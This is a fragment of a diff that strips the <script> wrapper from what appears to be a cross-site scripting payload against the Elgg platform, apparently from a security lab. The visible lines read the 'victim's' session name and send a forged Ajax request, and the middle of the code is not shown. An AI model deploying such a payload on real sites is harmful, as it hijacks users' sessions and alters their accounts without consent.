@@ -1,4 +1,3 @@
-<script type="text/javascript">
 window.onload = function(){
   // get the name and guid of the victim (we don't want to change those)
   var userName="&name="+elgg.session.user.name;
@@ -24,4 +23,3 @@ window.onload = function(){
     Ajax.send(content);
   }
 }
-</script>
